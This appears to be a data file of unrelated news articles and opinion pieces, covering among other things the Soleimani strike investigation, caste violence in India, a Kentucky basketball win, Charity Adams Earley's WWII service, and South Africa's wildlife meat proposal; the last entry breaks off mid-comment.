0,"Falih al-Fayadh, Iraq’s National Security Adviser and head of Iraq’s pro-Iranian Popular Mobilization Front (PMF) Shi’ite militias, is looking into whether Syrian and Iraqi informants helped coordinate the U.S. airstrike that killed Iranian Gen. Qassem Soleimani. Among those suspected of leaking Soleimani’s whereabouts to the U.S. are two Baghdad airport security workers and two employees for Cham Wings, the private airline that secretly brought Soleimani to Baghdad on the night he was killed. According to an exclusive from Reuters, Iraq’s National Security investigators have “strong indications that a network of spies inside Baghdad Airport were involved in leaking sensitive security details,” the resulted in the U.S. successfully targeting and killing Soleimani. Soleimani reportedly avoided using his private plane, amid concerns about his security. Cham Wings had instead enabled Soleimani and his security entourage to travel aboard a Cham Wings flight with their names removed from the passenger manifest. Soleimani landed in Baghdad to join Abu Mahdi Muhandis, the deputy head of the same PMF group al-Fayadh leads, only to be killed minutes later by a U.S. drone firing two missiles. Soleimani’s security team, traveling in a separate vehicle, was hit by another missile seconds later. The Iraqi investigation into how Soleimani was killed on their watch reportedly began within minutes of the airstrikes. Iraqi National Security agents immediately moved to seal off the airport and contain security staff from leaving. Cham Wings is based out of the Syrian capital of Damascus, and Soleimani was reportedly flying from Syria into Iraq when he was killed. “Initial findings of the Baghdad investigation team suggest that the first tip on Soleimani came from Damascus airport,” one Iraqi security official told Reuters. “The job of the Baghdad airport cell was to confirm the arrival of the target and details of his convoy.” Neither the media office for the Iraqi National Security agency or Iraq’s missions to New York and Washington D.C. responded to Reuters’ requests for comments on the case. The U.S. Department of Defense also declined to comment on whether well-placed informants helped track Soleimani. Meanwhile, U.S. officials who spoke to Reuters on condition of anonymity did say the U.S. had been tracking Soleimani’s whereabouts in the days preceding the strike, but did not detail how they confirmed his exact location. Starting in October, Soleimani had reportedly secretly increased attacks on U.S. troops in Iraq and increased the flow of weapons to proxy pro-Iranian militias in Iraq that helped carry out the attacks. Those pro-Iranian militias reportedly carried out deadly rocket attacks and instigated further attacks on the U.S. Embassy in Baghdad in the days leading up to Soleimani’s death. "
0,"A 22-year-old Dalit woman died after being allegedly raped by two men in UP's Balrampur district, an incident which comes amid nationwide outrage over the Hathras gang-rape case. The woman's mother said she was abducted in the morning while on way to secure a college admission, as reported by ndtv.com. When she failed to return in time, the family launched a search for the woman. The family says she returned around 7 pm, and that the assailants had allegedly put her on an e-rickshaw and sent her home, sources said. ""The men had injected her with some substance due to which she lost consciousness. Then they raped her... They broke her legs, they broke her back. A rickshaw-wallah brought her home. They was thrown in front of our house. My child could barely stand or speak,"" the woman's mother said, weeping. ""Somehow, crying, my daughter said, 'Save me, I do not want to die',"" the mother said. She added that soon after her return, her daughter complained of a burning pain in her stomach. ""The doctor at the local hospital said her condition is serious and advised that she be taken to Lucknow. But she died when we were near Balrampur town,"" she added. The girl looked dazed and had an intravascular cannula, medically known as Vigo and used for administering injection or other fluids in the body, inserted in her hands, said Balrampur Superintendent of Police Dev Ranjan Verma. About the reports that the victim's legs and back were broken, he said, ""It was not confirmed in the post-mortem. We contradict this news."" The victim was cremated on Wednesday after the post-mortem in the presence of her family members, the police said. The district magistrate and the SP, along with the mahant of the Devipatan temple, Mithilesh Nath Yogi, visited the victim's house on Thursday morning, met the family members and condoled her death. ""The family members were assured that the accused will be given a strict punishment in accordance with law. A letter sanctioning a financial assistance of Rs 6,18,450 was handed over to them by the mahant. The amount will be sent to the victim's mother bank account by the afternoon,"" a statement issued here said. The mother has demanded a compensation of Rs 25 lakh and a government job for her son. ""My daughter wanted to become a lawyer but she was killed. The same fate should await the culprits. We want justice. My son should be given a government job and we should get at least Rs 25 lakh as compensation,"" she said. The ""jungle raj"" that has spread in Uttar Pradesh has no limits and the time for accountability is now, Congress general secretary Priyanka Gandhi Vadra said, adding that a gruesome incident like Hathras had taken place in Balrampur too. ""Law and order is not run by marketing and speeches. This is time for accountability of the Uttar Pradesh chief minister. The public wants accountability,"" Priyanka Gandhi said in a tweet in Hindi. Alleging that ""atrocities"" on women and the government's brazenness is continuing, former Congress president Rahul Gandhi said, ""Did not give respect when alive and also snatched the dignity in death."" His tweet, also in Hindi, referenced the Hathras victim's family being allegedly denied the right to properly perform her last rites. When the matter was reported to the police from the hospital, the parents alleged that their daughter was gang-raped, SP Verma added. Acting on the parent's complaint, police identified the accused as Shahid and Sahil and arrested them, the SP said. Reacting to the incident, Samajwadi Party supremo Akhilesh Yadav said, ""After Hathras, now a daughter was harassed and gang-raped in Balrampur. The victim died in serious condition. Condolences!"" ""The BJP government should commit no laxity in this case as was done in Hathras and arrest the accused immediately,"" he added with a hashtag #Balrampur... #NoMoreBJP"" on his Twitter handle. The Balrampur case comes at a time when there is a widespread outrage over the gang-rape of a Dalit woman in Hathras. A 19-year-old Dalit was allegedly sexually assaulted by four upper caste men on September 14 and referred on Monday to the Safdarjung Hospital in Delhi with spinal injuries, paralysis and cuts in her tongue. She died around 3 am on Tuesday."

0,"While Hindu, Sikh & Buddhist Scheduled Castes are entitled to reservation under law, Dalit Muslims aren’t recognised The recent conversion to Hinduism of almost 250 people part of an estimated 30-40 Muslim families in Haryana's Hisar district, is at first glance related to systemic stigmatisation of Muslims in the wake of the Tablighi Jamaat incident. But at the deeper level, the incident is connected to the long-standing and unaddressed plight of those at the lowest level of the Muslim social pyramid. Almost a fortnight prior to this incident in Bithmara village of Uklana block of Hisar, there had been another, albeit smaller, occurrence of Muslim families converting to Hinduism. In this incident in Danoda Kalan village in Jind district, all members of the families of six brothers converted to Hinduism. One of the brothers, when asked, regarding the immediate provocation, asserted that the ""Tablighi Jamaat episode pained them and they decided to convert for good. 'We are feeling greatly relieved after embracing Hinduism,' he said."" This decision was not endorsed by the majority of Muslims in the Jind village and they remain loyal to their faith. Although the village has a Bharatiya Janata Party (BJP) sarpanch, he was quoted by the media as saying that Muslims were under no pressure. The absence of comprehensive reportage makes it difficult to conclude if this claim is true or not. The families that converted in the two villages in Jind and Hisar are from the Doom community and are called Mirasi Muslims. They are known as folk singers and play folk musical instruments like the Rabaab. They are spread across Haryana, Punjab, and Rajasthan. In the initial years, before his fame spread far and wide, Guru Nanak was always accompanied by a person called Bhai Mardana, a Mirasi Muslim who played the instrument while Nanak recited hymns. This is considered the beginning of the Sikh Rababi or Kirtanee tradition of singing Shabad Kirtan. At a theatre festival in February 2020 in Jammu, a play, Bhanwarya Kallet, was performed and it was directed by theatre artist Sikandar Khan, of Mirasi descent. The play depicts the distressful life of community members and Khan is on record saying that due to societal pressure, he initially disowned his Mirasi identity, but later dug deeper into the community's ancestry. Like many communities in India, the Mirasis have a dual, even triple, religious identity. As a result, Mirasis can be Hindus, Muslims, and even Sikhs. There is the interesting case of Punjabi folk singer Mohammad Sadique who was elected member of Lok Sabha in May 2019 from the Faridkot constituency reserved for Scheduled Castes. A Mirasi and also member of the Doom caste, he was born in a non-practising Muslim family and at a certain point in his life, he veered towards Sikhism, and converted to the faith. He successfully contested for the Assembly in 2012 but his election was challenged in the Punjab and Haryana High Court on grounds that being a Muslim, he was not eligible to fight elections from a reserved constituency. He was unseated by the HC but on appeal in the Supreme Court, he was reinstated as MLA. The apex court had observed that “a person can change his religion or faith, but not the caste to which he belongs to, as caste has linkage to birth.” In the Haryana villages where the conversions have taken place, there are several other communities which are noted for dual or multiple religious identities. Communities like Teli and Lohar like the Mirasi, too have people who are either Hindus or Muslims. In recent years, anecdotal evidence suggests there have been conversions to Hinduism because of two factors. First, there has been increasing campaign against Muslims as a result of which these rural communities where there was previously no polarisation on religious lines, too, have got fractured. The second important reason is that while Hindu, Sikh, and Buddhist Scheduled Castes are entitled to avail of reservations under law, Dalit Muslims are not recognised. Although this demand has been listed for long and the problem of this community was dealt at length by the Sachar Commission, Dalit Muslims have not been extended reservations because of fear of backlash from Hindu SCs who will have to share the quota with Muslim Dalits. Notably, when neo-Buddhists were brought under this law and reservations were extended for them in 1990, there was no protest. Even earlier, in 1956 when ""Article 341 was amended to extend the same benefits that Hindu Dalits enjoy to Sikh Dalits,"" there had been no objection. The Sachar Committee concluded that ""there is a strong case for according Scheduled Caste status to Dalit Muslims and Christians."" Some Muslim communities have been included in the OBC list, but this does not benefit the weakest among Muslims. The Sachar Committee argued: ""In refusing SC status to Dalit Muslims and Christians the State violates Articles 14, 15 and 25 of the Constitution that guarantees equality before the law and prohibits discrimination on grounds of religion."" The Post-Sachar Evaluation Committee, headed by Prof Amitabh Kundu, presented its final report to Dr Najma Heptullah, the then Union Minister for Minority Affairs, in October 2014 after the Modi government had assumed office. It recommended that Dalit Muslims who were part of the OBC list should be taken out and ""incorporated in the SC list."" Furthermore, it made a case for some Muslim artisanal communities to be given Most Backward Castes sub-category status within the OBC list. Mass conversion of Muslims is considered as the 'final solution' to India's religious plurality and continued existence of minorities. Granting same rights and privileges to Dalit Muslims (and Dalit Christians) as being given to Hindus, Sikhs and Buddhists Scheduled Castes would halt the process of conversions like those witnessed in the two Haryana villages. Denial of these rights is seen as an important part of the overall Hindutva strategy. But given the significant presence of Muslims in India, it would be wiser now to reach out to the community and recognise social stratification in Muslims society. After having run a polarising campaign for three decades, it is time, especially in the wake of new challenges facing India where reviving the economy will be most vital for national reconstruction, to allow social harmony to flourish. India is seeking to woo companies intending to leave China in the wake of the pandemic. High levels of social strife and a polarised polity perpetually on the brink of eruption will stick out like a sore thumb in risk-evaluations that potential investors will conduct. It would be wise for the ruling regime to instruct cadre to actively discourage mass or even limited conversions as it may alarm the global community. After the Gulf backlash, this is another risk that is best avoided. (The writer is an author and journalist based in Delhi.

0,"Filed under: The Cats fought until the end and completed an unbelievable 18-point comeback for the big-time win. The Kentucky Wildcats got a huge win against the Florida Gators 71-70 in Gainesville Saturday afternoon in the last game of the regular season. The Cats came out how many expected they might: flat. And it was clear early on as they went into the half down 40-30. After the break, it got ugly. The officiating was horrific. Cal got ejected, or so he thought, then returned to the bench. And the team seemingly fell apart. Related They fought back the last 10 minutes, but it looked all for naught. But then something happened. The Cats exploded for a huge 18-point comeback win. The energy and effort they put forward could not be questioned as the game winded down. They fought to the very end. And it all paid off. What a win!!! Wait, what happened? We blacked out Apparently though, we came back to win from an 18-point second-half deficit on the road at Florida pic.twitter.com/suqJvuQcU5 As the regular season comes to an end, the postseason is in sight. Kentucky will play at 1 p.m. ET on Friday in Nashville. March Madness is officially here. Hagans did not make the trip After the turmoil that ensued during Kentuckyâ€™s second half collapse against the Tennessee Volunteers, there was rampant speculation and concern surrounding the team and Ashton Hagans. Well, that finally came to light this afternoon as John Calipari announced that Hagans did not even make the trip to Gainesville. Ashton did not make the trip with us to Florida. He and I met a couple days ago and he asked to step away for a couple days for personal reasons. I support his decision. We are going to need him at 100% for the postseason. While this isnâ€™t ideal heading into postseason play, the Cats need Hagans to make a deep run in the coming weeks. It looks like heâ€™s still being positive, though. Letâ€™s Get this Win Fellas!!! Love yâ€™all boyss Be back & Better!!! https://t.co/kRwLyDDzh0 Hopefully, this is just a blip on the radar and doesnâ€™t affect UK in the long term. These kinds of things tend to either tear a team apart, or bring them all together. They didnâ€™t respond well today, but weâ€™ll see how they respond going forward. New starting five The last time I did this was because of Hagans and thatâ€™s the case again today. In the first matchup with the Gators, Hagans was coming off a thigh contusion and was questionable leading up to the game. He playedâ€”quite a bit actuallyâ€”but Johnny Juzang earned his second start in his place. This time around, Keion Brooks was the one that earned the start. And Tyrese Maxey was running the point full-time for the first time in his short college career. The rest of the lineup remained the same, with the exception of Nate Sestina who started last game for the Senior Day festivities. The absence of Hagans meant UK was only able to play seven guys, but Calipari did mention that Dontaie Allen was available off the bench. Probably best not to burn his redshirt, though. The offense was stagnant, but recovered The offense was obviously stagnant without Hagans manning it. He makes mistakes and heâ€™s frustrating, but his ability to penetrate the defense and attack was clearly missing today. UK just couldnâ€™t get anything going. Florida changed up the defense time and time again and the Cats simply looked confused. They settled for jumpers and missed multiple point-blank shots. However, as the game went on, they fought back and it got much better. Enough to get a huge win on the road. Same with the defense Hagansâ€™ absence was not only felt on the offensive end, but it was felt even more so on the defensive end. He is amazing at shutting players down, stealing passes, and disrupting the opposing teamâ€™s offense. That wasnâ€™t there today and Kentucky looked bad at times. Whether it was losing their man or giving up easy drives, they just couldnâ€™t stop the Gators. One thing that mightâ€™ve had something to do with this was the fact that UK basically had seven guys to play the entire gameâ€”assuming Cal didnâ€™t want to burn Allenâ€™s redshirt. That meant guys had to be careful not to foul and over-aggressiveness was probably discouraged. But in the final half of the game, the Cats continued to claw and scrape until they cleaned it up to shut down the Gators in the final 10 minutes, Sestina, Juzang, and Brooks gave some big-time minutes One positive was the play from the normal bench guys. Setina, Juzang, and Brooks all played very well today. They all have their flaws, especially defensively, but they gave Kentucky really, really GREAT minutes when they desperately needed it. All three of these guys played as hard as Iâ€™ve seen anyone play all season. They deserve the credit for keeping UK from getting blown out in this one. Thatâ€™s big moving forward because the Cats will need it over the next few weeks. Bench play is huge and they will need to give the starters a breather when necessary. Despite the frustrations today, these guys took advantage of the opportunities they were given. I was ready to say, â€œLetâ€™s just throw this one out and forget it happened, deal?â€ But this team regrouped and straightened this thing out. What a game and what a win by UK. Go Cats!!!"

According to the reports, this appalling incident has happened on July 15 in Pennagaram, Dharmapuri district where the landlord had reportedly abused the boy, who defecated on the land owned by the former. Landlord Rajasekhar has allegedly forced the boy to carry the excreta to his house and at one extent, the landlord asked the boy to eat his own faeces. A 14-year-old boy is studying tenth standard and following the incident, the boy informed his father about what has happened after which his father filed a complaint in a police station. The reports say that the boy has defecated on Rajasehkar's land at 5 pm on July 15. Based on the complaint, the police has filed an FIR against the landlord in which it has been stated that Rajasekhar has reportedly hit the boy and asked him to carry the excreta to his house, after seeing the boy had defecated on his land. After being forced by the upper caste man, a Dalit boy has carried the faeces on his hands and walked for five meters and reached his home and he informed his father, who shocked to see his son carrying the faeces on his hands. He moved to the police and lodged a complaint and based on his complaint, the police have booked an FIR against Rajasekhar under sections 323 - Punishment for voluntarily causing hurt of the Indian Penal Code and Section 3(1) (i) of Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act, 1989.

This did not stop her from becoming the highest-ranked female, black officer in the army during World War II. Her mantra: “I just wanted to do my job.” When Charity Edna Adams was born on Dec. 5, 1918 in Kittrell, North Carolina, the United States was still celebrating its recent victory in the First World War. Despite the jubilation and the hope of the end of war forever, African Americans like Adams had dim prospects. The country was still heavily segregated, and racial discrimination was integrated into all aspects of American life. But Adams’ parents hardly accepted the system as it stood. Her father, Eugene, was an episcopal minister who was fluent in Hebrew and Greek. Her mother, also named Charity, was a schoolteacher. U.S. ArmyCharity Adams with a fellow member of the WAC. In one instance, captured in Adams’s memoir, One Woman’s Army, Eugene cancelled a health insurance policy he took out for his daughter because the insurance agent refused to call her “Miss” since she was “colored.” In another example, a vegetable vendor called Adams’ father “Uncle,” a discriminatory term for black males during the segregated Jim Crow era. To this Eugene replied, “Fine. And how is your mother, my sister?” This shut the merchant down completely. Eugene Adams would later become president of the local NAACP chapter in Columbia, South Carolina, where Adams spent most of her childhood. Charity Adams graduated valedictorian of her high school class with perfect attendance; she was two years younger than most of her classmates, as she started elementary school as a second grader. She had access to scholarships and chose Wilberforce University, a black college in Ohio. After graduating in 1938 with majors in physics, mathematics, and Latin, and a minor in history, she returned to South Carolina to teach while she attended graduate school at Ohio State University during the summers. Then the U.S. entered World War II. Wikimedia CommonsCharity Adams taking her oath as an officer in the U.S. Army. In 1942, Adams received a letter stating that the dean of Wilberforce University recommended her for the first class of the Women’s Army Auxiliary Corps, later known as the Women’s Army Corps (WAC). She decided that this was an outstanding opportunity for her with career and leadership potential. She applied that June, but when she didn’t receive an immediate response she forgot about it. She was on a bus to Ohio State to continue her graduate studies when she was summoned to the U.S. Army. After going through the interview and application process, she joined the WAC in July, one of only 39 black women in the corps’ first training class. Although Adams bonded with her fellow recruits – black and white — on the train to her station in Iowa’s Fort Des Moines, in her words, “the Army soon shattered whatever closeness we had felt.” “When we left the mess hall we were marched two-by-two’s to the reception center. A young, red-haired second lieutenant said, ‘Will all the colored girls move over on this side.’ He pointed to an isolated group of seats. There was a moment of stunned silence, for even in the United States of the 40’s it did not occur to us that this could happen. The integration of our trip did not prepare us for this. What made things worse was that even after the ‘colored girls’ had been pushed to the side, all the rest of the women were called by name to join a group to be led to their quarters. Why could not the ‘colored girls’ be called by name to go to their quarters rather than be isolated by race?” In another instance, Adams was denied a seat in a dining car because of her race. The black waiters all put down their trays and refused to work. She was seated. Wikimedia CommonsCharity Adams leads her troops during World War II. Adams also was questioned for her race by a colonel and asked to show identification by MPs who were told to check her out, not believing a black woman could be an officer (she was one of Fort Des Moines’ first black officers, and in September 1943 she was promoted to major). Adams’ backbone was best displayed when an Army general inspected her unit. Not all of her personnel were available to line up, as many of them were working and others were sleeping. “I’m going to send a white first lieutenant down here to show you how to run this unit,” he told her, to which Adams replied, “Over my dead body, sir.” The general threatened to court martial Adams and she countered with a charge that the general was violating an Allied directive to refrain from using segregationist language. The general backed down. U.S. Army.Charity Adams and some of her subordinates. At the end of 1944, Adams received her first overseas assignment as the commanding officer of the first — and only — battalion of black WAC’s to head to Europe. Their first stop was Birmingham, England, where she worked and mingled with people of all races. She even dated a white British man several times — something that would have been unheard of in the Jim Crow South. U.S. ArmyCharity Adams with staff members during World War II. Adams commanded the 6888th Central Postal Directory Battalion, leading 850 African American female personnel in Birmingham. This unit was responsible for sorting and delivering months worth of backlogged mail for some 7 million American troops in stationed in the European theater. The monumental importance of letters from home to soldiers’ morale cannot be understated. The assignment was also tricky since her unit was responsible for censoring mail that might have sensitive war information. Given six months to sort the mail, Adams split her battalion into three groups, each assigned an eight-hour shift. They worked 24 hours a day, seven days a week, and accomplished their task in only three months — half the allotted time. From England the battalion moved to Rouen and Paris, France, where they continued to sort backlogged mail — about 65,000 letters every day, by Adams’ estimation. Not only did Adams make sure American soldiers received their morale-boosters, she looked after the morale of her own personnel as well. When she discovered that the Army hadn’t set aside funds for beauty equipment for its female officers, she went to work. “Solving this problem,” she later wrote, “I learned that if you ask the same question of enough people enough times, you can get the necessary information.” And she got what she asked for. Wikimedia CommonsCharity Adams inspecting WAC troops of the 6888th Central Postal Directory Battalion Adams stayed with the army after the war’s end, but opted to leave the service shortly after receiving a promotion to lieutenant colonel. She was the highest-ranking black female officer in the American service. The National Council of Negro Women named her Woman of the Year in 1946. U.S. ArmyA mail unit during World War II. Adams returned to Ohio State and completed her masters degree in vocational psychology. She then served in academia and married Stanley A. Earley, Jr., a medical student, in 1949. The pair moved to Zurich, Switzerland for two years while he finished his studies, and they ultimately settled in Dayton, Ohio and had two children. She became a dean at Tennessee A&I College and Georgia State College, and served on the boards of many community organizations. She founded the Black Leadership Development Program in Dayton in 1982, educating and training African Americans to be leaders in their communities.  For her groundbreaking career Charity Adams Earley has been recognized by the National Women’s History Museum and the Smithsonian National Postal Museum.

Unibale Pty Ltd - a subsidary of major state-owned Chinese agriculture company COFCO Corporation - has acquired 7,000 megalitres of water in the Gwydir River system in the north of New South Wales' Murray-Darling Basin. Foreign investors in the region emerged after the easing of basin trading rules in 2014 - which allowed companies to buy and sell water more easily. Former Australian Federal Police commissioner Mick Keelty, who is now the Inspector General of the basin's water resources, said many in the community were frustrated by the arrival of interloper companies to buy up the scarce resource. Aerial view of Murray Darling Junction at Wentworth in New South Wales' far south west. A Chinese communist party-owned company is buying up rights to Australia's scarce water supply 'There is a segment of the community who says why should people own water who don't have any interest in agriculture?' he told 7.30. 'Equally, there's a section of the community that says, ""well, the government made this decision that gave us some options to trade in water and we have actually invested in that trade.""' Water is already scarce in the region - which has struggled through 'extreme drought' for the past two years, according to the Murray-Darling Basin Authority. It is not clear what Unibale are doing with the water supply but Daily Mail Australia has contacted COFCO Corporation for comment. Mr Keelty said while a foreign ownership register was introduced in 2017 which required overseas companies to declare their interests, the register was not accessible to the public. He added the sale and purchase of water commodities was not overseen to the same degree by the government as materials like gold or minerals. 'It is a commodity and yet it doesn't have the same governance and due diligence around it as other commodities, and that's what's of concern to people,' Mr Keelty said. Former AFP commissioner Mick Keelty (pictured) said many in the community were frustrated non-agricultural companies were free to buy up water supplies McCullough Robertson law firm partner Duncan Bedford said the Chinese acquisition skirted around the Foreign Investment Review Board. 'FIRB approval may be required for the acquisition of water assets when it forms part of a broader business acquisition. But on their own, water entitlements do not require FIRB approval,' he said. Adding to the frustration of farmers in the Murray-Darling region, the perceived lack of government oversight comes despite the Treasury saying it would review nearly all foreign asset purchases during the COVID-19 pandemic. Locals are seen on the Louth bridge over the Darling Barka river, as a flow of water from upstream arrives on February 24, 2020. The Murray-Darling has fought through drought for the past two to three years The importance of water assets was highlighted when it recently emerged that Australia could soon run out of rice because of mismanagement of the water supply during the coronavirus pandemic. The Southern Murray, which stretches across the south-eastern states, is normally responsible for 60 per cent of the country's grain and dairy production. It is widely regarded as 'Australia's food bowl' but with the Murray in a state of zero-water allocation for the past two years, rice and dairy farms aren't growing produce. The Murray-Darling Basin stretches across the south-eastern states and covers South Australia, Victoria, Queensland and New South Wales A general view of a parched Wilcannia weir on March 4, 2019 in north-western New South Wales 'Rice is definitely a big risk because we haven't been using the water we've got to grow rice,' Ms Slattery, a former employee of the Murray-Darling Basin Authority, said. The Murray-Darling Basin Authority has hit back though, saying: 'There is no problem with our food security and it’s mischievous and misleading for vested interest groups to use COVID-19 to push their biased and incorrect positions.' Daily Mail Australia has contacted Unibale Pty Ltd for comment. 'The foreign investment review framework balances the need to ensure Australia remains an attractive destination for foreign investment while also ensuring individual foreign investments are not contrary to the national interest. 'The Government also recognises the importance of transparency around foreign ownership of agricultural land and water.' For this reason, the Government introduced public registers covering foreign investment into these asset classes.'

0,"The London Times reports on the discovery of a major spy ring in Australia. The guilty country is not named, but obviously is China: Australia’s national intelligence agency has broken up a large foreign spy ring but faces an unprecedented level of espionage directed from overseas, its director-general has revealed. Mike Burgess, head of the Australian Security Intelligence Organisation (ASIO), said it had stopped a “sleeper” agent running a spy ring that provided logistical and financial support for foreign agents engaged in intelligence-gathering and the harassment of dissidents. “The level of threat we face from foreign espionage and interference activities is unprecedented,” Mr Burgess said. “It is higher now than it was at the height of the Cold War.” This is rather chilling: Mr Burgess said: “We’ve seen visiting scientists and academics ingratiating themselves into university life with the aim of conducting clandestine intelligence collection.” That certainly has happened here, too. “ASIO has uncovered cases where foreign spies have travelled to Australia with the intention of setting up sophisticated hacking infrastructure targeting computers containing sensitive and classified information,” Mr Burgess said. “And perhaps most disturbingly, hostile intelligence services have directly threatened and intimidated Australians in this country.” He said that the case of the sleeper agent unmasked by his agency read like a “Cold War thriller”. “The agent lay dormant for many years, quietly building community and business links, all the while secretly maintaining contact with his offshore handlers,” Mr Burgess said. “The agent started feeding his spymasters information about Australia-based expatriate dissidents, which directly led to harassment of the dissidents in Australia and their relatives overseas. Whatever the Chinese have done to infiltrate and spy on Australia, we can be sure they have done orders of magnitude more to infiltrate and spy on the U.S. Chinese influence on American universities, which has been bought and paid for, is particularly alarming. Given what we now know about the conduct of China’s Communist regime, it is hard to understand the deference that the American government paid to the Chinese prior to the Trump administration.

Ali Yousif Ahmed Al-Nouri, 42, is wanted in Iraq on charges of premeditated murder of the Iraqi police officers in 2006, according to a statement by the US Attorney’s Office District of Arizona. An Iraqi judge issued a warrant for Al-Nouri’s arrest and the government there issued an extradition request to the US Justice Department, the statement said. The Justice Department sought an arrest warrant for Al-Nouri and he was taken into custody on Thursday in Phoenix. He appeared before a federal magistrate judge in Phoenix on Friday in connection with proceedings to extradite him to Iraq, the statement said. According to the Iraqi government, Al-Nouri was the leader of an al-Qaeda group in Fallujah which planned operations targeting Iraqi police. The statement noted the details in the Iraqi complaint were allegations that had yet to been proven in court. Al-Nouri’s extradition would have to be certified by the US court and the US Secretary of State would then decide whether to surrender him to Iraq, the statement said. It was not immediately possible to contact Al-Nouri for comment or determine whether he had hired a lawyer. The statement did not provide information on when Al-Nouri entered the United States or how long he had lived in Phoenix. (Reuters)"

Union Home Minister Amit Shah on Wednesday (February 5) announced that the Shri Ram Janmabhoomi Teertha Kshetra, set up by the government for construction of a temple in Ayodhya, will have 15 trustees and one of them will be from the Dalit community. The home minister’s statement comes a little over an hour after Prime Minister Narendra Modi announced in Lok Sabha about the constitution of the trust. “There will be 15 trustees in the Shri Ram Janmabhoomi Teertha Kshetra Trust out of which one trustee will always be from the Dalit society,” he tweeted. Shah congratulated Modi “for such an unprecedented decision” that strengthens social harmony. The home minister said the trust will be independent to take every decision related to the temple and 67 acres of land will be transferred to it. “I fully believe that the waiting of millions of people for centuries will be over soon and they will be able to pay obeisance to Lord Shri Ram in his grand temple at his birthplace,” he said. Also Read: Trust to be set up for construction of Ram Temple in Ayodhya: PM Shah thanked the prime minister for his commitment for construction of a temple dedicated to Lord Ram, “who is a symbol of faith and unwavering reverence of India.” “Today is a day of immense joy and pride for the whole country,” he said in another tweet. He said as per the Supreme Court order on the Ram Janmabhoomi issue, the central government has taken a historic decision to form a trust in the name of Lord Ram, showing its commitment towards the construction of the grand temple in Ayodhya. While making the announcement for the trust in Lok Sabha, the Prime Minister said the Union Cabinet also decided to transfer 67.703 acre land to the trust. The Uttar Pradesh government has agreed to give five acres of land to the UP Sunni Wakf Board as directed by the Supreme Court in the Ayodhya matter, Modi said. UP government spokesperson Shrikant Sharma said the land is in Dhannipur village in Ayodhya on the Lucknow highway, about 18 kilometres from the district headquarters. While delivering the judgement on November 9, the Supreme Court had said the trust should be formed within three months for the construction of the temple at the site where many Hindus believe Lord Ram was born."
0,"by ACFMar 25, 2020Bushmeat, Conservation Threats, Corona virus32 comments South Africa is turning towards the implementation of new laws that fully allows the economic exploitation of wildlife. The intention is to market the use of all kinds of wild species, including giraffes, zebras, emu, and duikers, in order to produce cheap meat. However, the current corona virus crisis shows this can be a public health, economic and ecological disaster. Despite the pandemic, and despite the causes of this zoonosis, South Africa is preparing to expand and intensify captive breeding of wild species and sell their meat in the food markets. This is an alarming turning point in the nation’s immense biological heritage management policies. The plan was published in the Official Gazette on 28 February in a proposal to revise the Meat Safety Act, the law that has regulated meat production since 2000. The proposal is to expand the number of non-domestic but edible species “that can be slaughtered as food for humans or for animal consumption”. The list contains 104 species, including: zebras, red hartebeest, wildebeest, springbok, dik dik, lechwe, kudu, duiker, gemsbok, eland, impala, rhinos (black and white), hippos, giraffes, elephants and crocodiles. The proposal also points out that “this scheme includes animals that are listed as endangered species, in accordance with conservation measures, and therefore their slaughter for both human and animal consumption must be in line with the most relevant conservation indications”. For some time, conservation and breeding have been going on the same track in South Africa. The move by the Government, in which the Ministry of the Environment and the Ministry of Agriculture move along a concerted path dotted with legal gaps, has not surprised those in South Africa working in the conservation and in the wildlife farming industry, which supplies trophy animals to hunters and lion bones to Chinese and South East Asian buyers. In May 2019, the previous Minister of Agriculture had passed an amendment to a 1998 law, the Animal Improvement Act (AIA), to reclassify 33 wildlife species as farm animals, including lions, cheetahs, rhinos and zebras, without public consultation. This allow these animals to be used for breeding, slaughtering and genetic manipulation in farms scattered across the country, the notorious wildlife farms. As a result, these wildlife farms can use artificial insemination and genetic manipulation to obtain animals with special characteristics, for example faster, larger or of a different colour. These animals are highly sought after by hunters, who seek out-of-norm trophies for their collections. The government of South Africa has decided to turn towards a complete “wildlife economy” where wild animals are a raw material on which to plan profits. South Africa has now taken a path of use of its fauna which is transforming the country into a genetic laboratory in the name of “sustainable development”. In the midst of an increasingly serious economic crisis, while education levels in the country are also decreasing, the government turns to extraction of resources at all costs for an immediate profit. While China, on February 24, decided to ban wildlife trade by also asking CITES for more stringent measures, South Africa seems to want to take a completely opposite path, in defiance not only of the precautionary principle, but of international concerns Nobody knows how many of the animals on the Chinese markets came from South Africa and the country is preparing to expand a market that hides unknown oublic health dangers. For this reason, on March 21, which is Human Rights Day in South Africa, the EMS Foundation together with about sixty other organizations and institutions will demonstrate in Cape Town to ask the Minister of the Environment Barbara Creecy to close the meat industry and to take a position against Covid-19 and against the consumption of wild meat. People will be virtually united for animal, environmental and human rights, which are strictly related. Please find the full story here: La Stampa (in Italian) Author: Elisabetta Corrà The Coronavirus pandemic is revealing the best and worst leadership in the world. This has to rate amongst the latter, up there with the USA, Brazil, Australia and North Korea! This cannot be allowed as it is our wildlife is exploited and many species are on the brink of extinction. As it is cattle, chickens, pigs and others are living lives in captivity and misery. Now they want to put animals who are born to be wild to also live in misery. No this cannot be allowed. I agree 100%. There is enough food for large populations by growing vegetables, rice, herbs and spices to use for a variety of meals. Wildlife MUST be kept wild! The eco safari is the way to go once the Coronna virus has been extinguished. Why is it that Kenya is doing brilliantly in conservation and not SA? As I see it, South Africa is being brainwashed into this industry(if you can call it that)- by allowing themselves to be influenced by the thinking of certain so-called humans- that shall remain nameless( am sure everyone knows who they are). Just a sign of how greedy & how cruel these sub-humans are- with no regard for conservation or for these sentient beings- not to talk of the fact , that one does not have to consume meat!!!!!!!!!!!!!! as some cultures dictate , that the only way to live, is by consuming large quantities of meat!!!!!!!!!. I for one am a vegetarian & live a healthy life- no colestrol, high blood pressure or diabetes, or weight problems- speaks for itself!- wake up South Africa & the rest of the world for that matter!If the virus that is making people “drop like flies” does not show humans the error of their ways, then there is no hope for the future generations Absolutely disgusting This is just flippin crazy. Its the worse idea to ever be suggested. After this pandemic which has killed so many people and caused such economic tragedy to the world.i cannot understand why this is even been considered and that we are now fighting to stop this idiotic plan. I support you 100 percent !! This is outrageous! Wild life should be protected not to be used for human consumption. Stop the world I want off Be it enacted… this will be the start of a new pandemic, zoonotic diseases galore! Horrendous! Hideous! As a qualified conservationist and wildlife inspector this goes against all conservation efforts and by no means close to best practices! Where is the IUCN and CITES in this? What loopholes are in NEMBA, NEMA? How can this be promoted… our legislation is as vague as our legislators and definitely not worth the paper it is on. Can we start a petition to oppose this? Besides the promotion to consume wildlife, there are countless wildlife captive animal welfare concerns. This cannot be allowed. People need to stop eating animals. The cruelty and torcher should not 